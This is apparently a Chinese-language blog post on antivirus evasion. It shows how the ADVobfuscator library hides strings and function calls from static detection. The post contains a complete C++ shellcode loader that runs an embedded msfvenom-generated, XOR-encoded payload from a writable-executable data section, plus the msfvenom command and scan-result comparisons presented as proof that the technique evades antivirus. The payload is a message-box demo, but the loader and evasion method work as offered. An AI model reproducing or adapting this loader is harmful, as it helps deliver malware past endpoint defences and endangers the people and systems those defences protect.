# 编译时混淆字符串&函数调用

## 简介

在做免杀的时候发现了一个宝藏项目[ADVobfuscator](https://github.com/andrivet/ADVobfuscator)，这个项目能在编译时混淆函数调用和字符串，通常字符串会被杀毒软件作为比较典型的特征，如果我们能在编译时混淆这些东西，那么会对杀毒软件判断的静态特征产生很大程度的避免，同时混淆函数调用也能对行为查杀产生一定程度的影响。

mimikatz特征：

![](../.gitbook/assets/image%20%28129%29.png)

## 使用

在配置完之后，我们可以直接查看混淆和无混淆编译出来后的结果。

未混淆：

```text
printf("hello world\n");
```

![](../.gitbook/assets/image%20%28133%29.png)

混淆:

```text
 printf(OBFUSCATED("hello world\n"));
```

![](../.gitbook/assets/image%20%28131%29.png)

同样我们可以同类似的方法来测试函数混淆，使用被杀烂的加载器编写方式，然后去在线查毒对比效果。

```text

#if !defined(DEBUG) || DEBUG == 0
#define BOOST_DISABLE_ASSERTS
#endif

#pragma warning(disable: 4503)

#define ADVLOG 1

#include "Log.h"
#include "MetaString.h"
#include "ObfuscatedCall.h"
#include "ObfuscatedCallWithPredicate.h"
#include <Windows.h>
#include <stdio.h>

#pragma comment(linker, "/section:.data,RWE")   
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  
#pragma comment(linker, "/INCREMENTAL:NO") 
using namespace std;
using namespace andrivet::ADVobfuscator;

char shellcode[] = "\xeb\x23\x5b\x89\xdf\xb0\xb5\xfc\xae\x75\xfd\x89\xf9\x89\xde"
"\x8a\x06\x30\x07\x47\x66\x81\x3f\x2a\x1d\x74\x08\x46\x80\x3e"
"\xb5\x75\xee\xeb\xea\xff\xe1\xe8\xd8\xff\xff\xff\x11\xb5\xfa"
"\x32\x4a\x98\xce\xa1\xca\xed\xbf\x64\xec\x98\xe8\x98\xcf\x9b"
"\x17\x21\x16\x56\x77\x90\x2e\x0c\x41\x65\x19\x57\x91\x2f\xca"
"\x64\xff\xfa\xfb\xee\xf0\xf9\xc9\xee\xee\xee\x1e\xca\xc7\xf5"
"\x85\xc7\x6a\x3a\xea\x2f\xcc\xac\x69\x2f\xd7\x7a\x95\x6f\x2e"
"\x95\x68\x12\x95\x68\x02\x95\x58\x16\x95\x60\x3e\x95\x28\x26"
"\x51\x06\x6b\xed\x47\x1f\xcf\xe1\xff\x7e\x95\x72\x3a\x3a\x95"
"\x5b\x22\x95\x4a\x36\x66\x1f\xf4\x95\x54\x06\x95\x44\x3e\x1f"
"\xf5\xfd\x2a\x57\x95\x2a\x95\x1f\xf0\x2f\xe1\x2f\xde\xe2\xb2"
"\x9a\xde\x6a\x19\xdf\xd1\x13\x1f\xd9\xf5\xea\x25\x62\x3a\x36"
"\x6b\xff\x95\x44\x3a\x1f\xf5\x78\x95\x12\x55\x95\x44\x02\x1f"
"\xf5\x95\x1a\x95\x1f\xf6\x97\x5a\x3a\x02\x7f\xdd\xac\x16\x37"
"\xca\x97\xfb\x97\xdc\x76\x90\x50\x10\xf2\x4c\xf6\x81\xe1\xe1"
"\xe1\x97\x5b\x1a\xa5\x60\xc6\xfc\x6d\x99\x02\x3a\x4c\xf6\x90"
"\xe1\xe1\xe1\x97\x5b\x16\x76\x72\x72\x3e\x5f\x76\x2d\x2c\x30"
"\x7a\x76\x6b\x6d\x7b\x6c\x2e\xc5\x96\x42\x3a\x14\x97\xf8\x48"
"\xe1\x4b\x1a\x97\xdc\x4e\xa5\xb6\xbc\x53\xa2\x99\x02\x3a\x4c"
"\xf6\x41\xe1\xe1\xe1\x76\x71\x66\x46\x3e\x76\x7f\x79\x7b\x5c"
"\x76\x53\x7b\x6d\x6d\x2f\xc5\x96\x42\x3a\x14\x97\xfd\x76\x46"
"\x3e\x3e\x3e\x76\x53\x4d\x58\x3f\x76\x6c\x71\x73\x3e\x76\x71"
"\x32\x3e\x78\x76\x56\x7b\x72\x72\x2f\xd7\x96\x52\x3a\x0e\x97"
"\xff\x2f\xcc\x4c\x4d\x4f\x4c\xe1\xce\x2f\xde\x4e\xe1\x4b\x16"
"\x0c\x41\x2a\x1d";

void exec()
{
    ((void(*)(void)) & shellcode)();
}

int main(int, const char* [])
{
    OBFUSCATED_CALL0(exec);
    //exec();
    return 0;
}

```

![](../.gitbook/assets/image%20%28134%29.png)

```text
msfvenom -p windows/messagebox -e x86/xor_dynamic -i 2 -f c
```

查杀效果：

![](../.gitbook/assets/image%20%28128%29.png)

![](../.gitbook/assets/image%20%28132%29.png)

对于这种被杀烂的编写方式还是有比较明显的免杀效果的。

github:[https://github.com/idiotc4t/ObfuscationStrings-new](https://github.com/idiotc4t/ObfuscationStrings-new)

## LINKS

{% embed url="https://github.com/andrivet/ADVobfuscator" %}


